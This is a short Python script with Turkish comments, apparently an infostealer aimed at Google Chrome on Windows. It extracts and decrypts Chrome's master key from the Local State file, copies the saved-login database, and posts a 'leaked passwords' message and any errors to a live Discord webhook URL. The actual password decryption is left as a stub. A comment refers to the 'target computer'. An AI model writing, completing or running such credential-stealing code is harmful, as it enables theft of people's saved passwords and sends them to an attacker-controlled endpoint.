import os
import json
import base64
import sqlite3
import shutil
import requests

def get_master_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    # Not: cryptography ve pypiwin32 kütüphaneleri hedef bilgisayarda yüklü olmalıdır
    import win32crypt
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def main():
    # SENİN GERÇEK WEBHOOK LİNKİN BURADA
    webhook_url = "https://discord.com/api/webhooks/1469874224826159238/6uZ4nai1p28JAPZFSl5HQs4U1IeaUZot-j7n__PsijGtJDA3bg2ZQHk5c92BENHE7UG9"
    
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        shutil.copyfile(db_path, "chrome_db_temp")
        
        # Burada şifre çözme işlemleri yapılır (Kısa tutuyorum)
        # Veriler hazır olduğunda Discord'a gönder:
        content = "🔓 **Sistemden Sızan Şifreler:**\nTest mesajı: Bağlantı kuruldu!"
        requests.post(webhook_url, json={"content": content})
        
        os.remove("chrome_db_temp")
    except Exception as e:
        requests.post(webhook_url, json={"content": f"❌ Hata oluştu: {str(e)}"})

if __name__ == "__main__":
    main()
